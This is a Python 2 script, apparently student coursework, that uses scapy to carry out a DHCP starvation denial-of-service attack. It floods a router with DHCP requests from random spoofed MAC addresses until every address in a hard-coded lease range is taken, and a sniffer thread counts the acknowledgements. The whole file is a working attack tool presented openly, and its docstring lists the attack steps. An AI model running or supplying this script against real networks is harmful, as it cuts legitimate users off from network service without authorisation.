
#!/usr/bin/python
'''
Written in python 2 (Tested on LinuxDebian distro)
Author: ys3334@nyu.edu
GitHub: reg1reg1

Python Script using scapy to performa a denial of service attack on the router

Steps:
1)Determine the ip of the router
2)Determine the ip of your own machine, make sure to leave this ip out of the dhcp lease request
3)Fuzz MAC addresses and request ip addresses from the router, make sure there are no duplicates. RandMAC() may be used for this
4)Run the attack till you exhaust the remote router of the ip addresses to lease out.

'''
import sys
import getopt
from scapy.all import *
import threading
import time

registeredIp=set()

class ReplySniffer(threading.Thread):
    def __init__(self,id):
        threading.Thread.__init__(self)
        self.id=id
    def sniffReplies(self):
        #print("Sniffing "+str(self.id))
        #Sniff is a blocking call but thread switching can revoke it
        sniff(filter="(port 67 or port 68)",prn=self.packetHandler,store=0)

    def packetHandler(self,packet):
        global registeredIp
        #if ACK received mark task as dregisterone
        #msg="Packet Sniffed, Analyzing contents......\n"
        #print(msg)
        if packet[DHCP].options[0][1]==5:
            if packet[IP].dst not in registeredIp:
                print("ACKED and acquired"+packet[IP].dst)
                registeredIp.add(packet[IP].dst)
        elif packet[DHCP].options[0][1]==6:
            pass

    def run(self):
        print("Initiating sniffing....")
        self.sniffReplies()


class Requester(threading.Thread):
    '''
    Keep requesting for Ip's which are not in registeredList
    '''
    srcMac=set()
    srcMac.add("")
    def __init__(self,id):
        threading.Thread.__init__(self)
        self.id=id
    def run(self):
        #pull ip out of queue
        print("Starting thread ",self.id)
        global registeredIp
        routerIp="192.168.13.2"
        myIp="10.10.111.100"
        #Keep sending packets till all Ip's are not sent outself.
        #This thread only sends packets

        #keep sending packets which are not in the registeredIp Set
        #Sniffing thread controls the emptiness of queue, so when all ip's are registered sending thread exits as well
        #Make the queue.join, so main program does not exit until all threads have been registered
        d=0.02
        while len(registeredIp)<99:
            macGen=""

            for ip in range(101):
                ipaddr="10.10.111." + str(ip+100)

                if ipaddr==myIp:
                    #print("SELF-IP non acquireable")
                    registeredIp.add(myIp)
                    continue
                elif ipaddr in registeredIp:
                    continue
                if len(registeredIp)>90:
                    d=0.1
                    strmessage = "Last few...Attempting to acquire ipAddress, throttling delay"+ipaddr
                    print(strmessage)
                while macGen in Requester.srcMac:
                    macGen = RandMAC()
                #print("Mac chosen as ",macGen)
                Requester.srcMac.add(macGen)
                # generate DHCP request packet
                packet = Ether(src=macGen, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=RandString(12, "xxxxooooxxxx"))/DHCP(options=[("message-type", "request"),("requested_addr", ipaddr),("server_id", routerIp),"end"])
                sendp(packet,verbose=0)
                time.sleep(d)
            print("Ip's acquired"+str(len(registeredIp)))



def main():
    #Write logic to incorporate arguments to your code using getopt
    #Initialize Queue and fill it with ip addresses

    replySniffer = ReplySniffer("Sniffer")
    replySniffer.setDaemon(True)
    replySniffer.start()

    requester= Requester("Requester")
    requester.setDaemon(False)
    requester.start()

    print("Finished DHCP Starvation Attack")

if __name__ == '__main__':
    main()
